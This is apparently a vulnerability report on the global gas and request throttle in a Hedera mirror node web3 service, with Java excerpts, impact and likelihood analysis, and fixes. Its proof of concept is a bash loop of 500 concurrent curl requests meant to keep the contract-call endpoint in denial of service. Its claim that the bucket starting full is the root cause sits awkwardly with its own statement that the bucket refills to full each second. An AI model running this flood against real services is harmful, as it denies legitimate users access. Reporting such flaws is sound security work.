### Title
Global Gas Throttle Bucket Full-Start Enables Sustained Per-Second Burst DoS of EVM Simulation

### Summary
The `gasLimitBucket` in `ThrottleConfiguration.java` is constructed with bucket4j's `Bandwidth.builder()` without calling `.initialTokens(0)`, causing the bucket to start completely full at application startup. Combined with a purely global (not per-user/per-IP) throttle and a `rateLimitBucket` that also starts full, any unprivileged user can immediately drain the entire per-second gas budget in a single burst, blocking all other users from the historical EVM simulation service. The attack is repeatable every ~1 second as both buckets refill to full capacity.

### Finding Description

**Code path:**

`ThrottleConfiguration.java` lines 34–45 (`gasLimitBucket()`):
```java
long gasLimit = throttleProperties.getGasPerSecond(); // scaleGas(7_500_000_000) = 750_000 tokens
final var limit = Bandwidth.builder()
        .capacity(gasLimit)
        .refillGreedy(gasLimit, Duration.ofSeconds(1))
        // ← NO .initialTokens(0) call
        .build();
return Bucket.builder()
        .withSynchronizationStrategy(SynchronizationStrategy.SYNCHRONIZED)
        .addLimit(limit)
        .build();
```

`ThrottleProperties.java` lines 38–47:
- `gasPerSecond` default = `7_500_000_000L`
- `GAS_SCALE_FACTOR = 10_000L`
- `scaleGas(7_500_000_000)` → `750_000` tokens (bucket capacity at startup)
- `maxGasLimit` per request = `15_000_000` → `scaleGas(15_000_000)` = `1_500` tokens consumed per max-gas request

`ThrottleManagerImpl.java` lines 37–42:
```java
public void throttle(ContractCallRequest request) {
    if (!rateLimitBucket.tryConsume(1)) { ... }
    else if (!gasLimitBucket.tryConsume(throttleProperties.scaleGas(request.getGas()))) { ... }
    // No per-user/per-IP check anywhere
}
```

**Root cause:** bucket4j's `Bandwidth.builder()` without `.initialTokens(n)` defaults `initialTokens = capacity`. Both `gasLimitBucket` (750,000 tokens) and `rateLimitBucket` (500 tokens) start completely full. The throttle is a single global shared state with no per-user or per-IP partitioning.

**Why existing checks fail:**
- The `rateLimitBucket` (500 RPS) is also global and starts full — an attacker consumes all 500 RPS tokens simultaneously.
- The `gasLimitBucket` starts with exactly `750,000` tokens = `500 requests × 1,500 tokens/request` (at max gas).
- A single attacker sending 500 concurrent requests with `gas=15,000,000` drains both buckets in one burst.
- After ~1 second, `refillGreedy` restores both buckets to full capacity, and the attack repeats.

### Impact Explanation
Every other user of the historical EVM simulation endpoint (`/api/v1/contracts/call`) is denied service for ~1 second per attack cycle. Since the attack is trivially repeatable with no cooldown beyond the 1-second refill window, a single attacker can sustain near-continuous throttling of all other users. This is a complete availability denial of the historical Hashgraph EVM simulation service for legitimate users, with no data written or modified (read-only DoS).

### Likelihood Explanation
No authentication, no special privileges, no account, and no API key are required. Any external user who can reach the endpoint can execute this. The attacker needs only an HTTP client capable of sending 500 concurrent requests — trivially achievable with `curl`, `ab`, `wrk`, or any scripting language. The attack is stateless and repeatable indefinitely every second.

### Recommendation
1. **Start the bucket empty at initialization** by adding `.initialTokens(0)` to the `Bandwidth.builder()` chain in `gasLimitBucket()` (and `rateLimitBucket()`). This eliminates the cold-start burst window.
2. **Add per-IP or per-client rate limiting** as a secondary layer so no single source can consume the entire global gas budget. This is the more complete fix.
3. Optionally, reduce `capacity` relative to `refillGreedy` rate (e.g., set capacity to a fraction of `gasPerSecond`) to limit the maximum burst size even if the bucket starts full.

### Proof of Concept

**Preconditions:** Mirror node web3 service running with default config (`gasPerSecond=7_500_000_000`, `requestsPerSecond=500`, `maxGasLimit=15_000_000`). No authentication required.

**Steps:**
```bash
# Send 500 concurrent max-gas requests immediately (drains both RPS and gas buckets)
for i in $(seq 1 500); do
  curl -s -X POST http://<mirror-node>/api/v1/contracts/call \
    -H "Content-Type: application/json" \
    -d '{"data":"0x","gas":15000000,"to":"0x0000000000000000000000000000000000000001"}' &
done
wait

# All 500 requests consume: 500 × 1,500 = 750,000 gas tokens (entire bucket)
# Simultaneously consumes all 500 RPS tokens

# Any concurrent legitimate user request during this window receives:
# HTTP 429 "Gas per second rate limit exceeded."

# After ~1 second, repeat — sustaining the DoS indefinitely
```

**Expected result:** Legitimate users receive `ThrottleException("Gas per second rate limit exceeded.")` for the duration of the attack, with no ability to access historical EVM simulation. [1](#0-0) [2](#0-1) [3](#0-2)

    @Min(0)
    @Max(100)
    private float gasLimitRefundPercent = 100;

    @Min(21_000)
    @Max(10_000_000_000_000L)
    private long gasPerSecond = 7_500_000_000L;

    @Min(1)
    private long opcodeRequestsPerSecond = 1;

    @NotNull
    private List<RequestProperties> request = List.of();

    @Min(1)
    private long requestsPerSecond = 500;

    // Necessary since bucket4j has a max capacity and fill rate of 1 token per nanosecond
    public long getGasPerSecond() {
        return scaleGas(gasPerSecond);
    }

    public long scaleGas(long gas) {
        if (gas <= GAS_SCALE_FACTOR) {
            return 0L;
        }
        return Math.floorDiv(gas, GAS_SCALE_FACTOR);
    }
